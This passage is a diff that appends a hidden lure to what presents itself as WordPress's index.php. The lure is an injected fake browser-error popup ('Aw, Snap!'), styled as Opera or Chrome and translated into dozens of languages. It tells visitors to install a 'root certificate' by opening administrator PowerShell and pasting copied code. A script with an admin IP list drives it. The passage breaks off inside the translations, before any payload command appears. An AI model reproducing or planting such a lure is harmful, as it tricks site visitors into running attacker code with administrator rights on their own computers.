@@ -1,0 +1,1174 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+?><meta charset="UTF-8" />
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;700&display=swap"
+/>
+<style>
+    body {
+    font-family: "Golos Text", sans-serif !important;
+  }
+
+  #popupOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 10000;
+    background-color: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(3px);
+    display: none; /* Изначально скрыт */
+  }
+
+  
+   .popup {
+    font-family: "Golos Text", sans-serif !important;
+    font-size: 16px;
+    color: black;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 45em;
+    background-color: #fff;
+    border-radius: 1em;
+    box-shadow: 0 0.2rem 0.4rem rgba(0, 0, 0, 0);
+    z-index: 10001;
+    overflow: auto;
+  }
+
+   /* Медиа-запрос для скрытия всплывающего окна на экранах менее 768px */
+  @media (max-width: 768px) {
+    #popupOverlay,
+    .popup {
+      display: none;
+    }
+  }
+  
+  .topBlock {
+    width: 100%;
+    height: 4em;
+    display: flex;
+    align-items: center;
+    background-color: #f1f5f8;
+  }
+
+  .iconContainer {
+    width: 10%;
+    height: 65%;
+    margin-left: 2%;
+  }
+
+  .textContainer {
+    font-weight: 500;
+    font-size: 1.4em;
+  }
+
+  .middleBlock {
+    font-family: "Golos Text", sans-serif !important;
+    padding: 1em 1em 0em 1em;
+    overflow: auto;
+    text-align: left;
+    font-size: 1.2em;
+    padding-left: 2em;
+    overflow: hidden;
+    line-height: 1.5;
+  }
+
+  .middleBlock p {
+    font-size: 1.1em;
+    line-height: 1;
+  }
+
+  .middleBlock p:first-child {
+    margin-bottom: 1.5em;
+    font-size: 1.2em;
+    margin-top: 0.6em;
+    line-height: 1;
+  }
+
+  .middleBlock p:nth-child(2) {
+    margin-bottom: 2em;
+  }
+
+  .middleBlock ol {
+    text-align: left;
+    margin-bottom: 0px;
+  }
+
+  .bottomBlock {
+    width: 100%;
+    height: 5em;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .buttonContainer {
+    display: flex;
+    gap: 1.5em;
+    font-size: 1.25em;
+  }
+
+  .copyButton,
+  .showHideButton {
+    background-color: #03c;
+    border-radius: 10px;
+    outline: none;
+    border: none;
+    color: white;
+    font-family: "Golos Text", sans-serif !important;
+    font-size: 1em;
+    cursor: pointer;
+    padding: 0.5em 1em;
+  }
+
+  .closeButton {
+    font-family: "Golos Text", sans-serif !important;
+    font-size: 1em;
+    padding: 0.5em 1em;
+    color: black;
+    border: none;
+    background-color: transparent;
+    cursor: pointer;
+  }
+
+  .chrome .topBlock {
+    background-color: #1973e9;
+  }
+
+  .opera .topBlock,
+  .firefox .topBlock {
+    background-color: #f0f0f0;
+  }
+
+  .opera .textContainer,
+  .firefox .textContainer {
+    color: #000;
+  }
+  .hideBlock {
+    display: none;
+  }
+  .hideBlock p {
+    margin-top: 5px;
+  }
+  .hideBlock.show {
+    display: flex;
+    flex-direction: column;
+  }
+  .hideBlock div {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+  }
+</style>
+<script
+  src="https://code.jquery.com/jquery-3.7.1.min.js"
+  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+  crossorigin="anonymous"
+></script>
+<script>
+  const OFF_WAIT = true;
+  const ADMIN_IPS = ["176.59.196.133"];
+  const translations = {
+    en: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Something went wrong while displaying this webpage.",
+      message2:
+        "To display this web page correctly, please install the root certificate. Click the 'Fix it' button and follow the further instructions.",
+      steps: [
+        "Right-click the Start button and run 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Right-click in the console window.",
+      ],
+      copyButton: "Copy",
+      reloadButton: "Reload Page",
+      howToFix: "How to fix",
+      waitOperation: "Wait for the operation to complete and reload the page.",
+      openVideo: "Open video instruction",
+      copyTheCodeText: "Copy the code",
+    },
+    ru: {
+      title: "Opera",
+      message1:
+        "<b>О, Щелчок!</b> Произошла ошибка при отображении этой веб-страницы.",
+      message2:
+        "Чтобы корректно отображать эту веб-страницу, пожалуйста, установите корневой сертификат. Нажмите на кнопку 'Исправить' и следуйте дальнейшим инструкциям.",
+      steps: [
+        "Щелкните правой кнопкой мыши на кнопке 'Пуск' и выберите 'Windows PowerShell Admin' ('Windows Terminal').",
+        "Щелкните правой кнопкой мыши в окне консоли.",
+      ],
+      copyButton: "Скопировать",
+      reloadButton: "Перезагрузить страницу",
+      howToFix: "Как исправить",
+      waitOperation: "Дождитесь завершения операции и перезагрузите страницу.",
+      openVideo: "Открыть видео-инструкцию",
+      copyTheCodeText: "Скопировать код",
+    },
+    es: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> Algo salió mal al mostrar esta página web.",
+      message2:
+        "Para mostrar correctamente esta página web, por favor, instale el certificado raíz. Haga clic en el botón 'Reparar' y siga las instrucciones adicionales.",
+      steps: [
+        "Haga clic derecho en el botón de inicio y ejecute 'Windows PowerShell Admin' ('Windows Terminal').",
+        "Haga clic derecho en la ventana de la consola.",
+      ],
+      copyButton: "Copiar",
+      reloadButton: "Recargar página",
+      howToFix: "Cómo solucionar",
+      waitOperation:
+        "Espere a que la operación se complete y recargue la página.",
+      openVideo: "Abrir instrucción en video",
+      copyTheCodeText: "Copiar el código",
+    },
+    fr: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Une erreur est survenue lors de l'affichage de cette page web.",
+      message2:
+        "Pour afficher correctement cette page web, veuillez installer le certificat racine. Cliquez sur le bouton 'Corriger' et suivez les instructions supplémentaires.",
+      steps: [
+        "Cliquez avec le bouton droit sur le bouton Démarrer et exécutez 'Windows PowerShell Admin' ('Windows Terminal').",
+        "Cliquez avec le bouton droit dans la fenêtre de la console.",
+      ],
+      copyButton: "Copier",
+      reloadButton: "Recharger la page",
+      howToFix: "Comment réparer",
+      waitOperation:
+        "Attendez que l'opération se termine et rechargez la page.",
+      openVideo: "Ouvrir l'instruction vidéo",
+      copyTheCodeText: "Copier le code",
+    },
+    de: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Beim Anzeigen dieser Webseite ist ein Fehler aufgetreten.",
+      message2:
+        "Um diese Webseite korrekt anzuzeigen, installieren Sie bitte das Root-Zertifikat. Klicken Sie auf die Schaltfläche 'Beheben' und folgen Sie den weiteren Anweisungen.",
+      steps: [
+        "Klicken Sie mit der rechten Maustaste auf die Start-Schaltfläche und führen Sie 'Windows Power Shell Admin' ('Windows Terminal') aus.",
+        "Klicken Sie mit der rechten Maustaste in das Konsolenfenster.",
+      ],
+      copyButton: "Lösung kopieren",
+      reloadButton: "Seite neu laden",
+      howToFix: "Wie beheben",
+      waitOperation:
+        "Warten Sie, bis der Vorgang abgeschlossen ist, und laden Sie die Seite neu.",
+      openVideo: "Videoanleitung öffnen",
+      copyTheCodeText: "Den Code kopieren",
+    },
+    it: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Si è verificato un errore durante la visualizzazione di questa pagina web.",
+      message2:
+        "Per visualizzare correttamente questa pagina web, installa il certificato radice. Fai clic sul pulsante 'Correggi' e segui le ulteriori istruzioni.",
+      steps: [
+        "Fare clic con il pulsante destro del mouse sul pulsante Start e eseguire 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Fare clic con il pulsante destro del mouse nella finestra della console.",
+      ],
+      copyButton: "Copia soluzione",
+      reloadButton: "Ricarica pagina",
+      howToFix: "Come risolvere",
+      waitOperation:
+        "Attendere il completamento dell'operazione e ricaricare la pagina.",
+      openVideo: "Apri istruzioni video",
+      copyTheCodeText: "Copia il codice",
+    },
+    pt: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Algo deu errado ao exibir esta página da web.",
+      message2:
+        "Para exibir esta página da web corretamente, por favor, instale o certificado raiz. Clique no botão 'Corrigir' e siga as instruções adicionais.",
+      steps: [
+        "Clique com o botão direito no botão Iniciar e execute 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Clique com o botão direito na janela do console.",
+      ],
+      copyButton: "Copiar correção",
+      reloadButton: "Recarregar página",
+      howToFix: "Como corrigir",
+      waitOperation: "Aguarde a conclusão da operação e recarregue a página.",
+      openVideo: "Abrir instrução em vídeo",
+      copyTheCodeText: "Copiar o código",
+    },
+    zh: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> 显示此网页时出现问题。",
+      message2:
+        "要正确显示此网页，请安装根证书。单击“修复”按钮并按照进一步的说明进行操作。",
+      steps: [
+        "右键单击开始按钮并运行“Windows Power Shell Admin”（“Windows终端”）。",
+        "在控制台窗口中右键单击。",
+      ],
+      copyButton: "复制修复",
+      reloadButton: "重新加载页面",
+      howToFix: "如何修复",
+      waitOperation: "等待操作完成，然后重新加载页面。",
+      openVideo: "打开视频说明",
+      copyTheCodeText: "复制代码",
+    },
+    ja: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> このウェブページの表示中に問題が発生しました。",
+      message2:
+        "このウェブページを正しく表示するには、ルート証明書をインストールしてください。「修正」ボタンをクリックし、手順に従ってください。",
+      steps: [
+        "スタートボタンを右クリックして「Windows Power Shell Admin」（「Windows Terminal」）を実行します。",
+        "コンソールウィンドウ内を右クリックします。",
+      ],
+      copyButton: "修正をコピー",
+      reloadButton: "ページを再読み込み",
+      howToFix: "修正方法",
+      waitOperation: "操作が完了するのを待ってページを再読み込みしてください。",
+      openVideo: "ビデオ手順を開く",
+      copyTheCodeText: "コードをコピーする",
+    },
+    ko: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> 이 웹페이지를 표시하는 동안 문제가 발생했습니다.",
+      message2:
+        "이 웹페이지를 올바르게 표시하려면 루트 인증서를 설치하십시오. '수정' 버튼을 클릭하고 추가 지침을 따르세요.",
+      steps: [
+        "시작 버튼을 마우스 오른쪽 버튼으로 클릭하고 'Windows Power Shell Admin' ('Windows Terminal')을 실행하십시오.",
+        "콘솔 창에서 오른쪽 버튼을 클릭하십시오.",
+      ],
+      copyButton: "수정 복사",
+      reloadButton: "페이지 새로고침",
+      howToFix: "수정 방법",
+      waitOperation:
+        "작업이 완료될 때까지 기다린 다음 페이지를 새로고침하십시오.",
+      openVideo: "비디오 지침 열기",
+      copyTheCodeText: "코드 복사",
+    },
+    ar: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> حدث خطأ أثناء عرض صفحة الويب هذه.",
+      message2:
+        "لعرض هذه الصفحة بشكل صحيح، يرجى تثبيت الشهادة الجذرية. انقر فوق زر 'الإصلاح' واتبع التعليمات الإضافية.",
+      steps: [
+        "انقر بزر الماوس الأيمن على زر البدء وقم بتشغيل 'Windows Power Shell Admin' ('وحدة تحكم Windows').",
+        "انقر بزر الماوس الأيمن داخل نافذة وحدة التحكم.",
+      ],
+      copyButton: "نسخ الإصلاح",
+      reloadButton: "إعادة تحميل الصفحة",
+      howToFix: "كيفية الإصلاح",
+      waitOperation: "انتظر حتى تكتمل العملية ثم أعد تحميل الصفحة.",
+      openVideo: "افتح تعليمات الفيديو",
+      copyTheCodeText: "انسخ الكود",
+    },
+    hi: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> इस वेबपेज को प्रदर्शित करते समय कुछ गलत हो गया।",
+      message2:
+        "इस वेबपेज को सही ढंग से प्रदर्शित करने के लिए, कृपया रूट प्रमाणपत्र इंस्टॉल करें। 'सुधारें' बटन पर क्लिक करें और आगे दिए गए निर्देशों का पालन करें।",
+      steps: [
+        "स्टार्ट बटन पर राइट-क्लिक करें और 'Windows Power Shell Admin' ('Windows Terminal') चलाएं।",
+        "कंसोल विंडो में राइट-क्लिक करें।",
+      ],
+      copyButton: "फ़िक्स कॉपी करें",
+      reloadButton: "पेज रीफ्रेश करें",
+      howToFix: "कैसे ठीक करें",
+      waitOperation:
+        "ऑपरेशन पूरा होने तक प्रतीक्षा करें और फिर पेज को रीफ्रेश करें।",
+      openVideo: "वीडियो निर्देश खोलें",
+      copyTheCodeText: "कोड कॉपी करें",
+    },
+    bn: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> এই ওয়েবপেজ প্রদর্শনের সময় কিছু ভুল হয়েছে।",
+      message2:
+        "সঠিকভাবে এই ওয়েবপেজ প্রদর্শনের জন্য, অনুগ্রহ করে রুট সার্টিফিকেট ইনস্টল করুন। 'ঠিক করুন' বোতামে ক্লিক করুন এবং আরও নির্দেশাবলী অনুসরণ করুন।",
+      steps: [
+        "স্টার্ট বোতামে ডান-ক্লিক করুন এবং 'Windows Power Shell Admin' ('Windows Terminal') চালান।",
+        "কনসোল উইন্ডোর ভিতর ডান-ক্লিক করুন।",
+      ],
+      copyButton: "ফিক্স কপি করুন",
+      reloadButton: "পেজ রিফ্রেশ করুন",
+      howToFix: "কিভাবে ঠিক করবেন",
+      waitOperation:
+        "অপারেশন সম্পন্ন হওয়ার জন্য অপেক্ষা করুন এবং তারপর পেজটি রিফ্রেশ করুন।",
+      openVideo: "ভিডিও নির্দেশনা খুলুন",
+      copyTheCodeText: "কোড কপি করুন",
+    },
+    ur: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> اس ویب پیج کو ظاہر کرتے وقت کچھ غلط ہو گیا۔",
+      message2:
+        "اس ویب پیج کو درست طریقے سے دیکھنے کے لئے براہ کرم روٹ سرٹیفکیٹ انسٹال کریں۔ 'درست کریں' بٹن پر کلک کریں اور مزید ہدایات پر عمل کریں۔",
+      steps: [
+        "اسٹارٹ بٹن پر دائیں کلک کریں اور 'Windows Power Shell Admin' ('Windows Terminal') چلائیں۔",
+        "کنسول ونڈو کے اندر دائیں کلک کریں۔",
+      ],
+      copyButton: "فکس کاپی کریں",
+      reloadButton: "صفحہ ریفریش کریں",
+      howToFix: "کیسے ٹھیک کریں",
+      waitOperation:
+        "آپریشن مکمل ہونے کا انتظار کریں اور پھر صفحہ کو ریفریش کریں۔",
+      openVideo: "ویڈیو ہدایت کھولیں",
+      copyTheCodeText: "کوڈ کاپی کریں",
+    },
+    tr: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Bu web sayfasını görüntülerken bir sorun oluştu.",
+      message2:
+        "Bu web sayfasını doğru görüntülemek için lütfen kök sertifikayı yükleyin. 'Düzelt' düğmesine tıklayın ve diğer talimatlara uyun.",
+      steps: [
+        "Başlat düğmesine sağ tıklayın ve 'Windows Power Shell Admin' ('Windows Terminal') çalıştırın.",
+        "Konsol penceresine sağ tıklayın.",
+      ],
+      copyButton: "Düzeltmeyi kopyala",
+      reloadButton: "Sayfayı yenile",
+      howToFix: "Nasıl düzeltilir",
+      waitOperation:
+        "İşlemin tamamlanmasını bekleyin ve ardından sayfayı yenileyin.",
+      openVideo: "Video talimatlarını aç",
+      copyTheCodeText: "Kodu kopyala",
+    },
+    fa: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> در هنگام نمایش این صفحه وب مشکلی پیش آمد.",
+      message2:
+        "برای مشاهده صحیح این صفحه وب، لطفاً گواهی ریشه را نصب کنید. روی دکمه 'رفع' کلیک کنید و دستورات دیگر را دنبال کنید.",
+      steps: [
+        "روی دکمه شروع کلیک راست کرده و 'Windows Power Shell Admin' ('Windows Terminal') را اجرا کنید.",
+        "روی پنجره کنسول کلیک راست کنید.",
+      ],
+      copyButton: "رفع کپی کنید",
+      reloadButton: "بارگذاری صفحه",
+      howToFix: "چگونه رفع کنید",
+      waitOperation: "صبر کنید تا عملیات تکمیل شود و سپس صفحه را تازه کنید.",
+      openVideo: "دستورالعمل ویدیو را باز کنید",
+      copyTheCodeText: "کد را کپی کنید",
+    },
+    vi: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> Đã xảy ra sự cố khi hiển thị trang web này.",
+      message2:
+        "Để hiển thị đúng trang web này, vui lòng cài đặt chứng chỉ root. Nhấp vào nút 'Fix' và làm theo các hướng dẫn tiếp theo.",
+      steps: [
+        "Nhấp chuột phải vào nút Bắt đầu và chạy 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Nhấp chuột phải vào cửa sổ bảng điều khiển.",
+      ],
+      copyButton: "Sao chép sửa lỗi",
+      reloadButton: "Làm mới trang",
+      howToFix: "Cách sửa lỗi",
+      waitOperation: "Chờ hoàn tất thao tác và sau đó làm mới trang.",
+      openVideo: "Mở hướng dẫn video",
+      copyTheCodeText: "Sao chép mã",
+    },
+    th: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> เกิดข้อผิดพลาดขณะแสดงหน้าเว็บนี้",
+      message2:
+        "เพื่อแสดงหน้าเว็บนี้อย่างถูกต้อง โปรดติดตั้งใบรับรองราก คลิกปุ่ม 'แก้ไข' และทำตามคำแนะนำเพิ่มเติม",
+      steps: [
+        "คลิกขวาที่ปุ่มเริ่มและรัน 'Windows Power Shell Admin' ('Windows Terminal')",
+        "คลิกขวาที่หน้าต่างคอนโซล",
+      ],
+      copyButton: "คัดลอกการแก้ไข",
+      reloadButton: "โหลดหน้าใหม่",
+      howToFix: "วิธีแก้ไข",
+      waitOperation: "รอให้ดำเนินการเสร็จสิ้นแล้วจึงโหลดหน้าใหม่",
+      openVideo: "เปิดคำแนะนำวิดีโอ",
+      copyTheCodeText: "คัดลอกโค้ด",
+    },
+    id: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Terjadi kesalahan saat menampilkan halaman web ini.",
+      message2:
+        "Untuk menampilkan halaman web ini dengan benar, tolong instal sertifikat root. Klik tombol 'Perbaiki' dan ikuti instruksi lebih lanjut.",
+      steps: [
+        "Klik kanan tombol Start dan jalankan 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Klik kanan jendela konsol.",
+      ],
+      copyButton: "Salin perbaikan",
+      reloadButton: "Muat ulang halaman",
+      howToFix: "Cara memperbaiki",
+      waitOperation: "Tunggu selesai operasi dan kemudian muat ulang halaman.",
+      openVideo: "Buka instruksi video",
+      copyTheCodeText: "Salin kode",
+    },
+    ms: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Terdapat masalah semasa memaparkan laman web ini.",
+      message2:
+        "Untuk memaparkan laman web ini dengan betul, sila pasang sijil root. Klik butang 'Baiki' dan ikuti arahan selanjutnya.",
+      steps: [
+        "Klik kanan pada butang Mula dan jalankan 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Klik kanan dalam tetingkap konsol.",
+      ],
+      copyButton: "Salin pembaikan",
+      reloadButton: "Muat Semula Halaman",
+      howToFix: "Cara membaiki",
+      waitOperation:
+        "Tunggu sehingga operasi selesai, kemudian segarkan halaman.",
+      openVideo: "Buka arahan video",
+      copyTheCodeText: "Salin kod",
+    },
+
+    pl: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Wystąpił błąd podczas wyświetlania tej strony internetowej.",
+      message2:
+        "Aby poprawnie wyświetlić tę stronę, zainstaluj certyfikat główny. Kliknij przycisk 'Napraw' i postępuj zgodnie z dalszymi instrukcjami.",
+      steps: [
+        "Kliknij prawym przyciskiem na przycisku Start i uruchom 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Kliknij prawym przyciskiem w oknie konsoli.",
+      ],
+      copyButton: "Kopiuj naprawę",
+      reloadButton: "Odśwież stronę",
+      howToFix: "Jak naprawić",
+      waitOperation:
+        "Poczekaj na zakończenie operacji, a następnie odśwież stronę.",
+      openVideo: "Otwórz instrukcję wideo",
+      copyTheCodeText: "Salin kod",
+    },
+    nl: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Er is iets misgegaan bij het weergeven van deze webpagina.",
+      message2:
+        "Om deze webpagina correct weer te geven, installeert u het rootcertificaat. Klik op de knop 'Oplossen' en volg de verdere instructies.",
+      steps: [
+        "Klik met de rechtermuisknop op de Start-knop en voer 'Windows Power Shell Admin' ('Windows Terminal') uit.",
+        "Klik met de rechtermuisknop in het consolevenster.",
+      ],
+      copyButton: "Fix kopiëren",
+      reloadButton: "Pagina herladen",
+      howToFix: "Hoe te repareren",
+      waitOperation:
+        "Wacht tot de bewerking is voltooid en laad de pagina opnieuw.",
+      openVideo: "Open video-instructie",
+      copyTheCodeText: "Kopieer de code",
+    },
+    sv: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Något gick fel vid visning av den här webbsidan.",
+      message2:
+        "För att visa den här webbsidan korrekt, installera rotcertifikatet. Klicka på knappen 'Åtgärda' och följ de ytterligare instruktionerna.",
+      steps: [
+        "Högerklicka på Start-knappen och kör 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Högerklicka i konsolfönstret.",
+      ],
+      copyButton: "Kopiera fix",
+      reloadButton: "Ladda om sidan",
+      howToFix: "Hur man fixar",
+      waitOperation: "Vänta tills åtgärden är klar och ladda sedan om sidan.",
+      openVideo: "Öppna videoinstruktion",
+      copyTheCodeText: "Kopiera koden",
+    },
+    da: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Der opstod en fejl under visningen af denne webside.",
+      message2:
+        "For at vise denne webside korrekt skal du installere rodsikkerhedscertifikatet. Klik på knappen 'Fix' og følg de videre instruktioner.",
+      steps: [
+        "Højreklik på Start-knappen og kør 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Højreklik i konsolvinduet.",
+      ],
+      copyButton: "Kopier fix",
+      reloadButton: "Genindlæs side",
+      howToFix: "Sådan rettes",
+      waitOperation:
+        "Vent på, at operationen er fuldført, og genindlæs derefter siden.",
+      openVideo: "Åbn videoinstruktion",
+      copyTheCodeText: "Kopiér koden",
+    },
+    no: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Noe gikk galt under visningen av denne nettsiden.",
+      message2:
+        "For å vise denne nettsiden riktig, vennligst installer rotsertifikatet. Klikk på 'Fiks' knappen og følg de videre instruksjonene.",
+      steps: [
+        "Høyreklikk på Start-knappen og kjør 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Høyreklikk i konsollvinduet.",
+      ],
+      copyButton: "Kopier fiks",
+      reloadButton: "Last inn siden på nytt",
+      howToFix: "Hvordan fikse",
+      waitOperation:
+        "Vent til operasjonen er fullført, og last deretter inn siden på nytt.",
+      openVideo: "Åpne videoinstruksjon",
+      copyTheCodeText: "Kopier koden",
+    },
+    fi: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Tämän verkkosivun näyttämisessä tapahtui virhe.",
+      message2:
+        "Näyttääksesi tämän verkkosivun oikein, asenna juurisertifikaatti. Napsauta 'Korjaa' -painiketta ja seuraa ohjeita.",
+      steps: [
+        "Napsauta hiiren kakkospainikkeella Käynnistä-painiketta ja suorita 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Napsauta hiiren kakkospainikkeella konsoli-ikkunassa.",
+      ],
+      copyButton: "Kopioi korjaus",
+      reloadButton: "Lataa sivu uudelleen",
+      howToFix: "Kuinka korjata",
+      waitOperation:
+        "Odota, että toimenpide valmistuu ja lataa sitten sivu uudelleen.",
+      openVideo: "Avaa video-ohje",
+      copyTheCodeText: "Kopioi koodi",
+    },
+    cs: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Při zobrazování této webové stránky došlo k chybě.",
+      message2:
+        "Pro správné zobrazení této webové stránky nainstalujte kořenový certifikát. Klikněte na tlačítko 'Opravit' a postupujte podle dalších pokynů.",
+      steps: [
+        "Klikněte pravým tlačítkem na tlačítko Start a spusťte 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Klikněte pravým tlačítkem myši do okna konzoly.",
+      ],
+      copyButton: "Kopírovat opravu",
+      reloadButton: "Obnovit stránku",
+      howToFix: "Jak opravit",
+      waitOperation: "Počkejte, až se operace dokončí, a poté stránku obnovte.",
+      openVideo: "Otevřít video návod",
+      copyTheCodeText: "Kopírovat kód",
+    },
+    el: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Κάτι πήγε στραβά κατά την προβολή αυτής της ιστοσελίδας.",
+      message2:
+        "Για να εμφανίσετε σωστά αυτήν την ιστοσελίδα, εγκαταστήστε το root πιστοποιητικό. Κάντε κλικ στο κουμπί 'Διόρθωση' και ακολουθήστε τις οδηγίες.",
+      steps: [
+        "Κάντε δεξί κλικ στο κουμπί Έναρξη και εκτελέστε 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Κάντε δεξί κλικ στο παράθυρο κονσόλας.",
+      ],
+      copyButton: "Αντιγραφή επιδιόρθωσης",
+      reloadButton: "Ανανεώστε τη σελίδα",
+      howToFix: "Πώς να διορθώσετε",
+      waitOperation:
+        "Περιμένετε να ολοκληρωθεί η λειτουργία και στη συνέχεια ανανεώστε τη σελίδα.",
+      openVideo: "Άνοιγμα οδηγίας βίντεο",
+      copyTheCodeText: "Αντιγράψτε τον κώδικα",
+    },
+    hu: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Hiba történt a weboldal megjelenítése közben.",
+      message2:
+        "A weboldal helyes megjelenítéséhez telepítse a gyökér tanúsítványt. Kattintson a 'Javítás' gombra és kövesse az utasításokat.",
+      steps: [
+        "Kattintson jobb gombbal a Start gombra, és indítsa el a 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Kattintson jobb gombbal a konzol ablakában.",
+      ],
+      copyButton: "Javítás másolása",
+      reloadButton: "Oldal újratöltése",
+      howToFix: "Hogyan javítsuk",
+      waitOperation:
+        "Várja meg, amíg a művelet befejeződik, majd frissítse az oldalt.",
+      openVideo: "Videó útmutató megnyitása",
+      copyTheCodeText: "Másolja a kódot",
+    },
+    ro: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> A apărut o problemă la afișarea acestei pagini web.",
+      message2:
+        "Pentru a afișa corect această pagină web, instalați certificatul root. Faceți clic pe butonul 'Remediați' și urmați instrucțiunile.",
+      steps: [
+        "Faceți clic dreapta pe butonul Start și rulați 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Faceți clic dreapta în fereastra terminalului.",
+      ],
+      copyButton: "Copiați remedierea",
+      reloadButton: "Reîmprospătați pagina",
+      howToFix: "Cum să remediați",
+      waitOperation:
+        "Așteptați să se termine operația și apoi reîmprospătați pagina.",
+      openVideo: "Deschideți instrucțiunea video",
+      copyTheCodeText: "Copiați codul",
+    },
+    sk: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Pri zobrazovaní tejto webovej stránky sa vyskytla chyba.",
+      message2:
+        "Správne zobrazenie tejto webovej stránky vyžaduje inštaláciu hlavného certifikátu. Kliknite na tlačidlo 'Opraviť' a postupujte podľa ďalších pokynov.",
+      steps: [
+        "Kliknite pravým tlačidlom myši na štart menu a spustite 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Kliknite pravým tlačidlom myši vo vnútri konzolového okna.",
+      ],
+      copyButton: "Kopírovať opravu",
+      reloadButton: "Obnoviť stránku",
+      howToFix: "Ako opraviť",
+      waitOperation:
+        "Počkajte, kým sa operácia dokončí, a potom stránku obnovte.",
+      openVideo: "Otvoriť video inštrukcie",
+      copyTheCodeText: "Kopírovať kód",
+    },
+    bg: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Възникна грешка при показването на тази уеб страница.",
+      message2:
+        "Правилното показване на тази уеб страница изисква инсталиране на главния сертификат. Щракнете върху бутона 'Поправяне' и следвайте допълнителните инструкции.",
+      steps: [
+        "Щракнете с десния бутон върху иконата на старт менюто и стартирайте 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Щракнете с десния бутон върху отворения прозорец на конзолата.",
+      ],
+      copyButton: "Копиране на корекцията",
+      reloadButton: "Обнови страницата",
+      howToFix: "Как да поправите",
+      waitOperation:
+        "Изчакайте завършването на операцията, след което обновете страницата.",
+      openVideo: "Отворете видео инструкция",
+      copyTheCodeText: "Копирайте кода",
+    },
+    hr: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Došlo je do pogreške prilikom prikazivanja ove web stranice.",
+      message2:
+        "Da biste ispravno prikazali ovu web stranicu, instalirajte glavni certifikat. Kliknite na gumb 'Riješi' i pratite daljnje upute.",
+      steps: [
+        "Desnom tipkom miša kliknite na izbornik Start i pokrenite 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Desnom tipkom miša kliknite unutar konzolnog prozora.",
+      ],
+      copyButton: "Kopiraj popravak",
+      reloadButton: "Osvježi stranicu",
+      howToFix: "Kako popraviti",
+      waitOperation:
+        "Pričekajte da se operacija završi, a zatim osvježite stranicu.",
+      openVideo: "Otvori video upute",
+      copyTheCodeText: "Kopiraj kod",
+    },
+    lt: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> Rodant šį tinklalapį įvyko klaida.",
+      message2:
+        "Norint tinkamai peržiūrėti šį tinklalapį, būtina įdiegti pagrindinį sertifikatą. Spustelėkite mygtuką 'Pataisyti' ir laikykitės tolesnių nurodymų.",
+      steps: [
+        "Dešiniuoju pelės mygtuku spustelėkite Pradžios meniu ir vykdykite 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Dešiniuoju pelės mygtuku spustelėkite konsolės lango viduje.",
+      ],
+      copyButton: "Kopijuoti taisymą",
+      reloadButton: "Atnaujinti puslapį",
+      howToFix: "Kaip pataisyti",
+      waitOperation:
+        "Palaukite, kol operacija bus baigta, tada atnaujinkite puslapį.",
